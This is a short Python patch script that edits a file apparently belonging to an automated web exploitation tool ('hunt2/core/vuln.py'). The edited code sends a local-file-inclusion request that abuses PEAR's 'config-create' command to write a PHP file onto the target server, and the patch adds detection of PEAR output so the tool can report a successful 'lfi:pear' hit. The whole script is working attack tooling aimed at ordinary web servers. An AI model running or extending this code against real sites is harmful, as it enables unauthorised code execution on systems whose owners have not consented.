import io, sys
P = r"C:\work\hunt2\core\vuln.py"
s = io.open(P, encoding="utf-8").read()

old = """                _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
                     body=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), ctype=CT)
                r = post(outp)"""
new = """                r1 = _req("POST", base + "/?+config-create+/" + payload + "+" + out + ".php",
                          body=("page_id=%d&pagename=%s" % (pid, _denc(incp))).encode(), ctype=CT)
                t1 = getattr(r1, "text", "") or ""
                if re.search(r"(?i)(PEAR_|Commands:|config-create|PEAR.Config)", t1):
                    return True, "lfi:pear " + inc, base + "/"
                r = post(outp)"""
if s.count(old) != 1:
    print("блок stage1 не найден"); sys.exit(1)
io.open(P, "w", encoding="utf-8", newline="\n").write(s.replace(old, new))
print("ok")